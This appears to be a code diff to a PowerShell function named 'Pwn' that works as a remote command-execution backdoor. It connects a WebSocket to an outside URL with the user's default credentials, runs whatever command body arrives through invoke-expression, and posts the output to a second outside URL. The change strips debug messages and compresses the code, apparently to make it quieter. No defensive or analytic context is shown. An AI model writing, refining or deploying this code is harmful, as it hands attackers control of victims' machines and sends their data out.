@@ -5,40 +5,29 @@ function Pwn()
     {
         do
         {
-            $ws = new-object system.net.websockets.clientwebsocket
-            $ct = new-object system.threading.cancellationtoken
-            $ws.options.usedefaultcredentials = $true
-            $conn = $ws.connectasync($urlIn, $ct)
+            $ws = new-object net.websockets.clientwebsocket;
+            $ct = new-object threading.cancellationtoken;
+            $ws.options.usedefaultcredentials=$true;
+            $conn = $ws.connectasync($urlIn, $ct);
+            $size = 1024;
+            $array = [byte[]]@(,0)*$size;
             while (!$conn.iscompleted)
             {
-                start-sleep -milliseconds 100
+                start-sleep -milliseconds 100;
             }
-            write-host "connected to $( $urlIn )"
-            $size = 1024
-            $array = [byte[]]@(,0) * $size
-            $command = [system.text.encoding]::utf8.getbytes("action=command")
-            $send = new-object system.arraysegment[byte] -argumentlist @(,$command)
-            $conn = $ws.sendasync($send, [system.net.websockets.websocketmessagetype]::text, $true, $ct)
-
-            while (!$conn.iscompleted)
-            {
-                start-sleep -milliseconds 100
-            }
-            write-host "finished sending request"
             while ($ws.state -eq 'Open')
             {
-                $recv = new-object system.arraysegment[byte] -argumentlist @(,$array)
-                $conn = $ws.receiveasync($recv, $ct)
+                $recv = new-object arraysegment[byte] -argumentlist @(,$array);
+                $conn = $ws.receiveasync($recv, $ct);
                 while (!$conn.iscompleted)
                 {
-                    start-sleep -milliseconds 100
+                    start-sleep -milliseconds 100;
                 }
-                $stringdata = [system.text.encoding]::ascii.getstring($recv.array);
-                $data = $stringdata.split("`n")[0]|convertfrom-json;
+                $sd = [system.text.encoding]::ascii.getstring($recv.array);
+                $data = $sd.split("`n")[0]|convertfrom-json;
                 try
                 {
-                    $result = (invoke-expression -command $data.body 2>&1|out-string);
-                    iwr -uri $urlOut -method post -body $result|out-null;
+                    iwr -uri $urlOut -method post -body (iex($data.body)2>&1|out-string)|out-null;
                 } catch {
                     iwr -uri $urlOut -method post -body $error[0]|out-null;
                 }
@@ -49,7 +38,6 @@ function Pwn()
     {
         if ($ws)
         {
-            write-host "closing websocket"
             $ws.dispose()
         }
     }
